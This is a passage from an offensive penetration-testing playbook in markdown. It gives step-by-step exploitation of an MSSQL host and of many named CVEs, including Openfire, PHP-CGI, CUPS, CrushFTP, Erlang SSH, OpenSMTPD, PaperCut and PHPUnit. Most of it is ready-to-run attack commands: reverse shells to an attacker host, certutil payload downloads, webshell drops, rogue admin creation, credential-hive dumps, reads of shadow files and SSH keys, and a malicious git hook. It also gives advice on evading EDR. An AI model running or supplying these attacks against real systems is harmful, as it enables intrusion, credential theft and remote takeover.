EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^> > C:\inetpub\wwwroot\shell.aspx';
```

```bash
# Trigger the dropped webshell
curl "http://<TARGET>/cmd.aspx?cmd=whoami"
```

#### MSSQL → AD Pivot (Credential Theft + Lateral Movement)

```sql
-- Identify the MSSQL service account
EXEC xp_cmdshell 'whoami /all';

-- Stored credentials (linked-server / SQL Agent creds)
SELECT name, credential_identity FROM sys.credentials;

-- AD recon from the MSSQL host
EXEC xp_cmdshell 'net user /domain';
EXEC xp_cmdshell 'net group "Domain Admins" /domain';
EXEC xp_cmdshell 'nltest /dclist:<DOMAIN>';

-- If running as SYSTEM / local admin — dump SAM + SYSTEM for offline secretsdump
EXEC xp_cmdshell 'reg save HKLM\SAM C:\Windows\Temp\sam';
EXEC xp_cmdshell 'reg save HKLM\SYSTEM C:\Windows\Temp\system';

-- Stage SharpHound for BloodHound collection
EXEC xp_cmdshell 'certutil -urlcache -split -f http://<ATTACKER_IP>/SharpHound.exe C:\Windows\Temp\sh.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\sh.exe -c All --zipfilename loot.zip --outputdirectory C:\Windows\Temp';
```

```bash
# Offline extraction of dumped hives
impacket-secretsdump -sam sam -system system LOCAL

# Lateral movement with the captured MSSQL service-account creds
netexec smb <SUBNET>/24 -u '<MSSQL_SVC_ACCOUNT>' -p '<PASSWORD>' --shares
netexec winrm <TARGET> -u '<MSSQL_SVC_ACCOUNT>' -p '<PASSWORD>'
```

> **OPSEC:** `xp_cmdshell` spawns `cmd.exe` as child of `sqlservr.exe` — high-signal in EDR. CLR Assembly + OLE Automation execute in-process and are quieter. `xp_dirtree` to attacker-controlled SMB is the cleanest hash-grab and leaves only an outbound SMB connection in the logs.

[↑ Back to top](#table-of-contents)

---

## Phase 14w: Openfire XMPP Server (TCP 9090/9091)

Openfire is a Java-based XMPP (Jabber) messaging server with a web admin console on port 9090 (HTTP) / 9091 (HTTPS). CVE-2023-32315 provides unauthenticated admin access via path traversal in the setup environment, after which plugin upload gives RCE as the Openfire service user (often SYSTEM on Windows).

### Enumeration

```bash
nmap -sV -p 9090,9091,5222,5223,5269 <TARGET>
curl -s http://<TARGET>:9090/login.jsp | grep -iE 'openfire|version'
curl -s http://<TARGET>:9090/setup/setup-/../../log.jsp    # CVE-2023-32315 path traversal probe
```

### Default Credentials

```text
admin:admin
admin:password
admin:openfire
```

### CVE-2023-32315 — Path Traversal Authentication Bypass

Openfire < 4.7.5 / 4.6.8. The path `/setup/setup-/../../<page>` bypasses the auth filter because the setup environment path is exempt from session checks.

```bash
# Confirm bypass — should return admin console content without auth
curl -s "http://<TARGET>:9090/setup/setup-/../../index.jsp" | grep -i 'Server Name'

# Create an admin user via the unauthenticated setup path
curl -s -X POST "http://<TARGET>:9090/setup/setup-/../../user-create.jsp" \
  -d "username=pwnadmin&password=Pwn123!&passwordConfirm=Pwn123!&isadmin=true&create=Create+Admin"

# Or grab an existing admin session — add a new admin via the bypass
curl -s -c cookies.txt "http://<TARGET>:9090/setup/setup-/../../login.jsp"
curl -s -b cookies.txt -X POST "http://<TARGET>:9090/setup/setup-/../../login.jsp" \
  -d "url=%2Findex.jsp&login=true&username=admin&password=admin"
```

### Exploitation — Plugin Upload RCE (Post-Auth or Post-Bypass)

```bash
# Openfire plugins are .jar files deployed via /plugin-admin.jsp
# Method 1: Use the management tool plugin (openfire-management-tool-plugin)
# Download from: https://github.com/miko550/CVE-2023-32315 (contains pre-built .jar)

# Upload plugin via admin console
curl -s -b cookies.txt -X POST "http://<TARGET>:9090/setup/setup-/../../plugin-admin.jsp" \
  -F "uploadfile=@openfire-management-tool-plugin.jar"

# After upload, access the management tool webshell at:
curl -s "http://<TARGET>:9090/plugins/openfire-management-tool/cmd.jsp?cmd=id"
curl -s "http://<TARGET>:9090/plugins/openfire-management-tool/cmd.jsp?cmd=whoami"

# Reverse shell
curl -s "http://<TARGET>:9090/plugins/openfire-management-tool/cmd.jsp?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200%3E%261%27"
```

```bash
# Method 2: Build custom plugin .jar with embedded webshell
mkdir -p plugin/lib
cat > plugin/plugin.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<plugin>
  <class>com.example.Pwn</class>
  <name>pwn</name>
  <description>pwn</description>
  <version>1.0.0</version>
  <minServerVersion>4.0.0</minServerVersion>
</plugin>
EOF
# Include a JSP webshell in plugin/web/cmd.jsp
mkdir -p plugin/web
echo '<%Runtime.getRuntime().exec(request.getParameter("c"));%>' > plugin/web/cmd.jsp
cd plugin && jar cf ../pwn.jar * && cd ..
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the path traversal bypass + plugin upload chain uses only HTTP requests
# No specialized tools needed beyond curl and a pre-built .jar file
curl -s "http://<TARGET>:9090/setup/setup-/../../system-properties.jsp" | grep -i version
```

### Post-Exploit

```bash
# Openfire on Windows often runs as SYSTEM via service wrapper
whoami
# Config file with DB creds
cat /opt/openfire/conf/openfire.xml 2>/dev/null
type "C:\Program Files\Openfire\conf\openfire.xml" 2>nul
# Contains: <connectionProvider> with JDBC URL, username, password (often plaintext)
```

---

## Phase 14x: PHP-CGI Argument Injection — CVE-2024-4577

PHP-CGI on Windows with specific ANSI code pages (Japanese 932, Simplified Chinese 936, Traditional Chinese 950) mishandles the Windows "best-fit" character mapping. The soft-hyphen `%AD` maps to a real hyphen `-`, allowing argument injection into the PHP-CGI binary. This bypasses the CVE-2012-1823 fix. Pre-auth RCE when PHP runs in CGI mode behind Apache/IIS.

### Enumeration

```bash
# Identify PHP-CGI (response headers)
curl -sI http://<TARGET>/ | grep -iE 'X-Powered-By|Server'
# PHP/8.x + Apache on Windows = candidate

# Confirm CGI mode — phpinfo page or error responses mentioning cgi
curl -s http://<TARGET>/phpinfo.php | grep -i 'Server API.*CGI'
curl -s "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
  --data '<?php echo "CVE-2024-4577"; ?>'
```

### Exploitation

```bash
# RCE via auto_prepend_file=php://input — injects PHP from POST body
curl -s -X POST "http://<TARGET>/php-cgi/php-cgi.exe?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
  --data '<?php system("whoami"); ?>'

# Alternative path (when php-cgi.exe is mapped differently)
curl -s -X POST "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
  --data '<?php system("whoami"); ?>'

# Reverse shell (Windows)
curl -s -X POST "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
  --data '<?php system("powershell -e <BASE64_PAYLOAD>"); ?>'

# Reverse shell (if target is Windows with bash via MSYS/Git)
curl -s -X POST "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
  --data '<?php system("certutil -urlcache -split -f http://<ATTACKER_IP>/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe"); ?>'
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the exploit IS a single HTTP request with crafted query string
# No tools beyond curl needed. The %AD byte is the entire bypass.
curl -s "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
  -d '<?php echo shell_exec("dir C:\\Users"); ?>'
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2024-4577 | PHP < 8.3.8 / 8.2.20 / 8.1.29 on Windows (code pages 932/936/950) | Argument injection via best-fit mapping |
| CVE-2012-1823 | PHP < 5.3.12 / 5.4.2 CGI | Original CGI argument injection (patched; 4577 bypasses it) |

---

## Phase 14y: PHP-FPM + Nginx Underflow RCE — CVE-2019-11043

Nginx + PHP-FPM with a `fastcgi_split_path_info` regex that can produce an empty `PATH_INFO` causes a buffer underflow in FPM, allowing env-var overwrite and ultimately arbitrary PHP code execution. Exploitable when the Nginx config uses a regex like `^(.+\.php)(/.*)$` and the FPM worker pool is reachable.

### Enumeration

```bash
# Identify Nginx + PHP-FPM (response headers)
curl -sI http://<TARGET>/ | grep -iE 'Server|X-Powered-By'

# Probe for the vulnerable config (a trailing path that triggers empty PATH_INFO)
curl -sI "http://<TARGET>/index.php/anything%0a.php"
# 502 Bad Gateway or crash = likely vulnerable fastcgi_split_path_info config
```

### Exploitation

```bash
# phuip-fpizdam — the canonical exploit tool
# Pre-compiled binary assumed available in engagement toolkit
./phuip-fpizdam "http://<TARGET>/index.php"

# After successful exploitation, the tool sets PHP_VALUE to enable code execution
# Access the backdoor path:
curl "http://<TARGET>/index.php?a=id"

# Reverse shell after backdoor is planted
curl "http://<TARGET>/index.php?a=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200%3E%261%27"
```

#### Living-off-the-land / LOTL variant

```bash
# The exploit requires sending many requests with specific newline positions to trigger
# the underflow. Without the phuip-fpizdam binary, manual exploitation is impractical.
# Minimal alternative: confirm vulnerability by observing 502s on crafted paths
for i in $(seq 1 50); do
  CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://<TARGET>/index.php/$(printf 'A%.0s' $(seq 1 $i))%0a.php")
  echo "pad=$i code=$CODE"
done
# Consistent 502s at certain padding lengths confirm the bug
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2019-11043 | PHP-FPM < 7.3.11 / 7.2.24 + Nginx with fastcgi_split_path_info | Buffer underflow → env overwrite → RCE |

---

## Phase 14z: Openfire / Misc App CVEs — Continued

### 14z.1 aiohttp Static-Resource Path Traversal — CVE-2024-23334

aiohttp < 3.9.2 web applications that serve static files with `follow_symlinks=True` allow path traversal to read arbitrary files outside the static root. The traversal bypasses the static-route prefix check.

```bash
# Identify aiohttp (server header)
curl -sI http://<TARGET>:<PORT>/ | grep -i server
# Server: Python/3.x aiohttp/3.x.x

# Traversal — the static route path + /../../../etc/passwd
# Common static route prefixes: /static, /assets, /files, /public
curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../etc/passwd"
curl --path-as-is "http://<TARGET>:<PORT>/assets/../../../../../etc/passwd"

# If the app uses a non-standard static prefix, fuzz it:
for p in /static /assets /files /public /media /resources; do
  CODE=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is "http://<TARGET>:<PORT>${p}/../../../../../etc/passwd")
  echo "$p -> $CODE"
done

# Read sensitive files
curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../etc/shadow"
curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../proc/self/environ"
curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../home/<USER>/.ssh/id_rsa"
curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../app/.env"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl with --path-as-is (prevents curl from normalizing the ../ sequences)
# No tools beyond curl needed
curl --path-as-is "http://<TARGET>:<PORT>/static/..%2f..%2f..%2f..%2f..%2fetc/passwd"
```

### 14z.2 Git Recursive-Clone RCE — CVE-2024-32002

Git < 2.45.1 / 2.44.1 / 2.43.4 / 2.42.2 / 2.41.1 / 2.40.2 / 2.39.4 on case-insensitive filesystems (Windows, macOS). A malicious repository with a submodule whose path component uses case-folding to create a symlink pointing into `.git/`, combined with a `post-checkout` hook in the submodule, achieves RCE on `git clone --recurse-submodules`.

```bash
# Exploitation scenario: attacker controls a Gitea/GitLab/GitHub repo that a target clones
# The malicious repo structure:
#   .gitmodules → submodule path = "A/modules/x" with URL pointing to hook-carrying repo
#   A symlink named "a" → ".git/modules/A/modules/x"
#   The submodule repo contains: hooks/post-checkout with arbitrary commands

# If you find a Gitea/GitLab instance that auto-clones repos (CI/CD, mirroring):
# 1. Create the malicious repo structure
mkdir exploit-repo && cd exploit-repo
git init
git submodule add --name x <ATTACKER_REPO_URL> A/modules/x
# Create symlink that exploits case-insensitivity: 'a' -> '.git/modules/A/modules/x'
# (on attacker Linux box, force the symlink into the tree object)
git update-index --add --cacheinfo 120000,$(echo -n "../.git/modules/A/modules/x" | git hash-object -w --stdin),a

# 2. The submodule repo (<ATTACKER_REPO_URL>) contains:
mkdir -p hooks
cat > hooks/post-checkout << 'EOF'
#!/bin/sh
curl http://<ATTACKER_IP>:<ATTACKER_PORT>/pwned?h=$(hostname)
bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
EOF
chmod +x hooks/post-checkout
git add hooks/post-checkout && git commit -m "hook"

# 3. Target clones with --recurse-submodules → hook fires
# git clone --recurse-submodules http://<GITEA_TARGET>/attacker/exploit-repo.git
```

#### Living-off-the-land / LOTL variant

```bash
# The exploit triggers automatically on `git clone --recurse-submodules` — no post-clone
# action needed. If you control a repo the target mirrors/clones, the hook fires on their end.
# Detection: look for git version < 2.45.1 on target
git --version    # from a shell on the target
```

### 14z.3 CUPS Unauth RCE Chain — CVE-2024-47176 / 47076 / 47175 / 47177

The CUPS printing subsystem (cups-browsed listening on UDP 631) can be coerced into fetching a malicious PPD from an attacker-controlled IPP server. The PPD injects commands via `FoomaticRIPCommandLine` which execute when a user prints to the attacker-added printer.

```bash
# Detection — cups-browsed listens on UDP 631, accepting unauthenticated printer advertisements
nmap -sU -p 631 <TARGET>
# If open: cups-browsed is running and accepting remote printer ads

# Confirm CUPS version
curl -s http://<TARGET>:631/ | grep -iE 'CUPS|version'
lpstat -r 2>/dev/null    # from a shell on target

# Exploitation with evil-cups (https://github.com/IppSec/evil-cups)
# Pre-built Python script — runs an IPP server that serves a malicious PPD
python3 evil-cups.py <ATTACKER_IP> <TARGET> "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"

# The exploit:
# 1. Sends a UDP packet to <TARGET>:631 advertising a new printer at http://<ATTACKER_IP>:12345/printers/pwn
# 2. cups-browsed fetches the PPD from attacker's IPP server
# 3. PPD contains FoomaticRIPCommandLine with the injected command
# 4. Command executes when ANY user prints to the new printer (or when cups auto-tests it)

# Trigger manually if auto-trigger doesn't fire:
# From a shell on target (after the printer is added):
echo test | lp -d <PRINTER_NAME>
```

#### Living-off-the-land / LOTL variant

```bash
# The UDP advertisement can be sent with pure Python (socket module) — no tools needed
python3 -c "
import socket
PKT = b'0 3 http://<ATTACKER_IP>:12345/printers/pwn \"pwn\" \"pwn\" \"MFG:Evil;MDL:Printer;\"'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(PKT, ('<TARGET>', 631))
s.close()
print('[+] Advertisement sent')
"
# You still need to serve the malicious IPP/PPD — minimal Python HTTP server suffices
```

### 14z.4 CrushFTP Authentication Bypass — CVE-2025-31161

CrushFTP < 10.7.1 / 11.1.0 has a race condition in AWS4-HMAC-SHA256 authentication header processing. Sending a crafted `Authorization: AWS4-HMAC-SHA256` header with a specific `Credential` value triggers a session assignment for an arbitrary user before auth validation completes.

```bash
# Identify CrushFTP
curl -sI http://<TARGET>:8080/ | grep -iE 'server|crushftp'
nmap -sV -p 8080,443,9090 <TARGET>

# Exploit — race-condition auth bypass to get an admin session
# Send the crafted AWS4 header — the server assigns a session for 'crushadmin' before validating
curl -s -v "http://<TARGET>:8080/" \
  -H "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/;SignedHeaders=;Signature=" 2>&1 | grep -i cookie
# Extract the session cookie from the response (CrushAuth=<VALUE>)

# With the admin session cookie, create a new admin user
curl -s -b "CrushAuth=<SESSION>" "http://<TARGET>:8080/WebInterface/function/?command=setUserItem&data_action=new&username=pwnadmin&password=Pwn123!&max_logins=0&role=admin"

# Login as the new admin
curl -s -c cookies.txt "http://<TARGET>:8080/WebInterface/function/?command=login&username=pwnadmin&password=Pwn123!"

# After admin access — CrushFTP admin can execute commands via:
# Server → Admin Prefs → Plugins → or via scheduled tasks with 'execute' action
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the entire bypass is a single HTTP request with a crafted header
curl -s "http://<TARGET>:8080/" \
  -H "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/;SignedHeaders=;Signature=" \
  -D - | grep -i 'set-cookie\|crushauth'
```

### 14z.5 Erlang/OTP SSH Pre-Auth RCE — CVE-2025-32433

Erlang/OTP SSH daemon (any application using the `ssh` Erlang library) allows pre-authentication channel requests. Sending `SSH_MSG_CHANNEL_REQUEST` with type `exec` before completing authentication causes command execution on vulnerable versions (OTP < 27.3.3 / 26.2.5.11 / 25.3.2.20).

```bash
# Identify Erlang SSH (banner)
nmap -sV -p 22,2222,4369 <TARGET>
# Look for: SSH-2.0-Erlang/<VERSION>
nc -nv <TARGET> 22
# 220 SSH-2.0-Erlang/5.1.2  ← vulnerable banner

# Exploitation — send channel request before auth completes
# Python PoC using paramiko transport layer manipulation:
python3 -c "
import socket, struct

HOST, PORT = '<TARGET>', 22
CMD = b'id'

s = socket.socket()
s.connect((HOST, PORT))
banner = s.recv(256)
print(f'[+] Banner: {banner.strip().decode()}')

# Send our banner
s.send(b'SSH-2.0-Exploit\r\n')

# After key exchange, before authentication, send SSH_MSG_CHANNEL_OPEN + SSH_MSG_CHANNEL_REQUEST
# This requires implementing SSH transport — use pre-built PoC from engagement toolkit
# https://github.com/ProDefense/CVE-2025-32433
print('[*] Use dedicated PoC tool for full exploit chain')
s.close()
"

# Using the ProDefense PoC (pre-compiled in toolkit):
python3 CVE-2025-32433.py <TARGET> <PORT> "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"
```

#### Living-off-the-land / LOTL variant

```bash
# Banner identification only — the exploit requires SSH protocol manipulation
# that cannot be achieved with standard ssh client or curl
nc -nv <TARGET> 22 </dev/null 2>/dev/null | grep -i erlang && echo "[!] Erlang SSH - check CVE-2025-32433"
```

### 14z.6 daloRADIUS — Default Credentials + Hash Extraction

daloRADIUS is a PHP web management application for FreeRADIUS. Default credentials provide operator-panel access where RADIUS user password hashes can be extracted.

```bash
# Identify daloRADIUS
curl -s http://<TARGET>/daloradius/ | grep -iE 'daloradius|radius'
curl -s http://<TARGET>/daloradius/app/operators/login.php
# Common paths: /daloradius, /radius, /daloradius/app/operators/

# Default credentials
# administrator:radius
curl -s -c cookies.txt -X POST "http://<TARGET>/daloradius/app/operators/login.php" \
  -d "operator_user=administrator&operator_pass=radius&location=default"

# Verify login
curl -s -b cookies.txt "http://<TARGET>/daloradius/app/operators/home.php" | grep -i dashboard

# Extract user credentials — navigate to Management → Users → List Users
curl -s -b cookies.txt "http://<TARGET>/daloradius/app/operators/mng-list-all.php" | \
  grep -oE 'username[^<]*|value[^<]*password[^<]*'

# Direct DB query if MySQL creds are known (from daloradius.conf.php)
cat /var/www/html/daloradius/app/common/includes/daloradius.conf.php 2>/dev/null | grep -E 'CONFIG_DB'
mysql -u <DB_USER> -p'<DB_PASS>' radius -e "SELECT username, value FROM radcheck WHERE attribute='Cleartext-Password' OR attribute='NT-Password';"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — login with default creds and scrape user list
curl -s -c cookies.txt -X POST "http://<TARGET>/daloradius/app/operators/login.php" \
  -d "operator_user=administrator&operator_pass=radius&location=default"
curl -s -b cookies.txt "http://<TARGET>/daloradius/app/operators/mng-list-all.php"
```

### 14z.7 OpenSMTPD Pre-Auth RCE — CVE-2020-7247

OpenSMTPD < 6.6.2 on OpenBSD/Linux. The `MAIL FROM` address validation allows shell metacharacters when the local part starts with a hyphen or contains specific sequences, enabling command injection during mail delivery.

```bash
# Identify OpenSMTPD
nmap -sV -p 25,465,587 <TARGET>
nc -nv <TARGET> 25
# 220 <hostname> ESMTP OpenSMTPD

# Exploitation — command injection via MAIL FROM
# The payload must fit within SMTP envelope constraints
nc <TARGET> 25 << 'EOF'
EHLO attacker
MAIL FROM:<;bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1';>
RCPT TO:<root>
DATA
Subject: pwn
.
QUIT
EOF

# Alternative payload format (semicolon-separated)
nc <TARGET> 25 << 'EOF'
EHLO x
MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d e f;do read r;done;sh;exit 0;>
RCPT TO:<root@localhost>
DATA
#0
#1
#2
#3
#4
#5
#6
#7
#8
#9
#a
#b
#c
#d
#e
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'
.
QUIT
EOF
```

```bash
# Metasploit
msfconsole -q -x "use exploit/unix/smtp/opensmtpd_mail_from_rce; \
set RHOSTS <TARGET>; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; run"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure netcat — no tools beyond nc needed
# The SMTP protocol exchange IS the exploit delivery mechanism
printf 'EHLO x\r\nMAIL FROM:<;id>/tmp/pwned;>\r\nRCPT TO:<root>\r\nDATA\r\ntest\r\n.\r\nQUIT\r\n' | nc <TARGET> 25
```

### 14z.8 OpenTSDB Command Injection — CVE-2020-35476

OpenTSDB < 2.4.1. The `/q` query endpoint passes the `yrange` parameter unsanitized into a gnuplot command, allowing OS command injection via backticks or `$()`.

```bash
# Identify OpenTSDB (default port 4242)
curl -s http://<TARGET>:4242/version | grep -i opentsdb
curl -s http://<TARGET>:4242/api/version

# Command injection via yrange parameter
curl -s "http://<TARGET>:4242/q?start=2000/10/26-00:00:00&end=2000/10/27-00:00:00&m=sum:sys.cpu.user&png&yrange=%5B0:100%5D&ylabel=cpu+percent+used&wxh=1500x200&style=linespoint&smooth=csplines&yrange=%5B33:system(%27id%27)%5D"

# Simpler PoC — inject into yrange
curl -s "http://<TARGET>:4242/q?start=2016/04/13&end=2016/04/14&m=sum:sys.cpu.nice&png&wxh=1&yrange=[0:$(id)]"

# Reverse shell
curl -s "http://<TARGET>:4242/q?start=2016/04/13&end=2016/04/14&m=sum:sys.cpu.nice&png&wxh=1&yrange=[0:\$(bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200>%261')]"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the injection is in the URL query parameter
curl "http://<TARGET>:4242/q?start=2000/10/26&m=sum:sys.cpu.user&png&yrange=[0:\$(cat%20/etc/passwd)]"
```

### 14z.9 PaperCut NG/MF — CVE-2023-27350 (Unauth RCE)

PaperCut NG/MF < 22.0.9 / 21.2.11 / 20.1.7 / 19.2.8. The `SetupCompleted` authentication bypass allows unauthenticated access to the admin interface, where the built-in print scripting engine (Groovy/JavaScript) provides RCE.

```bash
# Identify PaperCut (default port 9191 HTTP, 9192 HTTPS)
curl -sk https://<TARGET>:9192/app | grep -iE 'papercut|version'
nmap -sV -p 9191,9192 <TARGET>

# Auth bypass — SetupCompleted header manipulation
curl -sk "https://<TARGET>:9192/app?service=page/SetupCompleted" -I

# Exploit — after bypass, access print scripting (Admin → Scripting)
# Metasploit module:
msfconsole -q -x "use exploit/multi/http/papercut_mf_ng_auth_bypass; \
set RHOSTS <TARGET>; set RPORT 9192; set SSL true; \
set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; run"

# Manual — after gaining admin access, navigate to:
# Options → Advanced → Scripting → Print Scripts
# Enable scripting, then add a script with:
# Groovy:
Runtime.getRuntime().exec("bash -c {echo,<BASE64>}|{base64,-d}|{bash,-i}".split(" "))
# JavaScript:
var r = java.lang.Runtime.getRuntime(); r.exec("cmd.exe /c powershell -e <BASE64>");
```

#### Living-off-the-land / LOTL variant

```bash
# The auth bypass is curl-only; the RCE requires interacting with the admin UI
# scripting panel (browser or Burp to submit the scripting form)
curl -sk "https://<TARGET>:9192/app?service=page/SetupCompleted"
```

### 14z.10 phpLiteAdmin — SQLite DB as PHP Webshell (EDB-24044)

phpLiteAdmin with default password (`admin`) allows creating a SQLite database with a `.php` extension in the webroot. Insert PHP code as table data, then include/access the `.db.php` file for code execution.

```bash
# Identify phpLiteAdmin
curl -s http://<TARGET>/phpliteadmin.php | grep -i phpliteadmin
# Common paths: /phpliteadmin.php, /phpliteadmin/, /sqlite/

# Default credential
# password: admin

# Login
curl -s -c cookies.txt -X POST "http://<TARGET>/phpliteadmin.php" \
  -d "password=admin&remember=yes&login=Log+In"

# Step 1: Create new database with .php extension
curl -s -b cookies.txt "http://<TARGET>/phpliteadmin.php?action=database_create" \
  -d "new_dbname=/var/www/html/shell.php"

# Step 2: Create table in the new DB
curl -s -b cookies.txt "http://<TARGET>/phpliteadmin.php?action=table_create" \
  -d "tablename=pwn&tablefields=1&field%5B0%5D%5Bname%5D=code&field%5B0%5D%5Btype%5D=TEXT&field%5B0%5D%5Bdefaultvalue%5D=<?php system(\$_GET['c']); ?>"

# Step 3: Access the shell
curl "http://<TARGET>/shell.php?c=id"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the entire chain is HTTP POST requests to phpLiteAdmin
# No tools beyond curl and the default password needed
curl -s -b cookies.txt "http://<TARGET>/phpliteadmin.php?action=row_insert" \
  -d "table=pwn&field%5B0%5D=<?php system(\$_GET['c']); ?>"
```

### 14z.11 PHPUnit Eval-Stdin RCE — CVE-2017-9841

PHPUnit < 4.8.28 / 5.x < 5.6.3 exposed via `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` in composer-installed applications. Pre-auth PHP code execution via POST body.

```bash
# Discovery — common paths where PHPUnit eval-stdin.php is web-accessible
for path in \
  "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"; do
  CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://<TARGET>$path" -d '<?php echo "VULN"; ?>')
  echo "$path -> $CODE"
done

# Exploitation — POST raw PHP to eval-stdin.php
curl -s -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("id"); ?>'

# Reverse shell
curl -s -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\""); ?>'

# Windows target
curl -s -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php system("powershell -e <BASE64_PAYLOAD>"); ?>'
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the exploit is a single POST with PHP code in the body
curl -X POST "http://<TARGET>/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" \
  -d '<?php echo shell_exec("cat /etc/passwd"); ?>'
```

### 14z.12 ZoneMinder — CVE-2023-26035 (Auth Command Injection)

ZoneMinder < 1.36.33 / 1.37.33. The `daemonControl` API endpoint (`/zm/api/host/daemonControl.json`) passes user-supplied parameters to shell commands without sanitization, enabling authenticated command injection.

```bash
# Identify ZoneMinder (default port 80/443, path /zm/)
curl -s http://<TARGET>/zm/ | grep -iE 'zoneminder|version'
curl -s "http://<TARGET>/zm/api/host/getVersion.json"

# Default credentials
# admin:admin (or no auth if configured for plain HTTP)

# Authenticate and get token/cookie
curl -s -c cookies.txt "http://<TARGET>/zm/api/host/login.json" \
  -d "user=admin&pass=admin"
# Extract access_token from response

# CVE-2023-26035 — command injection via daemonControl
# The 'command' parameter is injected into a shell call
curl -s -b cookies.txt "http://<TARGET>/zm/api/host/daemonControl.json?token=<ACCESS_TOKEN>&command=;id"

# Reverse shell
curl -s -b cookies.txt \
  "http://<TARGET>/zm/api/host/daemonControl.json?token=<ACCESS_TOKEN>&command=;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200>%261'"

# Alternative injection point — snapshot ID parameter
curl -s -b cookies.txt -X POST "http://<TARGET>/zm/index.php" \
  -d "view=snapshot&action=create&monitor_ids[0][Id]=;id"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure curl — the injection is in a URL parameter passed to the API
curl -s "http://<TARGET>/zm/api/host/daemonControl.json?token=<ACCESS_TOKEN>&command=;cat%20/etc/passwd"
```

---

## Phase 15: Quick Reference — osTicket / MantisBT / OpenCart / Magento

### osTicket

```bash
# Recent: CVE-2023-32999 (auth SSRF), CVE-2023-44757 (XSS)
curl -s http://<TARGET>/osticket/scp/login.php
# Default creds typically rotated; check for ostadmin:ostadmin in lab envs
```

### MantisBT

```bash
# CVE-2017-7615 — admin password reset bypass
curl "http://<TARGET>/verify.php?id=1&confirm_hash=anything"
# CVE-2023-22476 — XSS

# Default: administrator:root (very old)
```

### OpenCart

```bash
# Admin path: /admin/ (configurable)
# Default: admin:admin

# CVE-2024-21518 (auth account takeover), CVE-2023-26832 (CSRF)
# Search via:
searchsploit opencart
```

### Magento

```bash
# Magmi installer leftovers — quick win
curl -s http://<TARGET>/magmi/web/magmi.php
curl -s http://<TARGET>/downloader/

# CVE-2022-24086 — pre-auth template injection RCE (Magento 2.4.3-p1)
# CVE-2024-34102 (CosmicSting) — XML XXE → admin RCE
```

---

## Phase 16: Generic CVE Lookup Workflow

### searchsploit

```bash
# Update DB (one-time / weekly)
sudo searchsploit -u

# Search
searchsploit apache 2.4.49
searchsploit -t "atlassian confluence"        # title-only
searchsploit --cve 2022-26134
searchsploit -e "tomcat 9"                     # exact match

# Examine PoC
searchsploit -x 50383

# Mirror locally to current dir
searchsploit -m 50383

# Search with multiple terms
searchsploit drupal 7 -w
```

### nuclei CVE templates

```bash
nuclei -ut                                                  # update
